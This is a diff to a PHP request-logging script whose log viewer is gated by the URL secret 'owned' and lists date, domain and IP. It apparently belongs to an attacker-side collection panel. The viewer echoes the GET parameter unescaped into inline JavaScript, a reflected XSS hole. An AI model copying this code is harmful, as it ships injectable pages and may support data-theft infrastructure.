@@ -1,8 +1,7 @@
 <?php
-// Log file
-$file='log.txt';
+$file='log.txt';	// Log File
 
-if(!isset($_GET['secret']) || $_GET['secret']!='owned') // view password
+if(!isset($_GET['secret']) || $_GET['secret']!='owned')	// Secret Password
 {
 	// Log it!
 	$file=fopen($file,'a+');
@@ -40,7 +39,7 @@ if(!file_exists($file)) die();
 $obj=file_get_contents($file);
 $obj='{"data":['.$obj.']}';
 $obj=json_decode($obj);
-$obj->data=array_reverse($obj->data);
+//$obj->data=array_reverse($obj->data);
 
 // output
 
@@ -56,7 +55,6 @@ if (isset($_GET['out']) && ($_GET['out']=='json'|| $_GET['out']=='json_data'))
 			$row=$obj->data[$x];
 			$row=array
 			(
-			  // same order columns
 				isset($row->date  )?$row->date  :'',
 				isset($row->domain)?$row->domain:'',
 				isset($row->ip    )?$row->ip    :'',
@@ -84,7 +82,8 @@ else
 		{
 		    $('#example').DataTable( 
 		    {
-		        "ajax": 'index.php?secret=<?php echo $_GET['secret']; ?>&out=json_data'
+		        "ajax": 'index.php?secret=<?php echo $_GET['secret']; ?>&out=json_data',
+		        "order": [[ 0, "desc" ]]
 		    } );
 		});
 		</script>
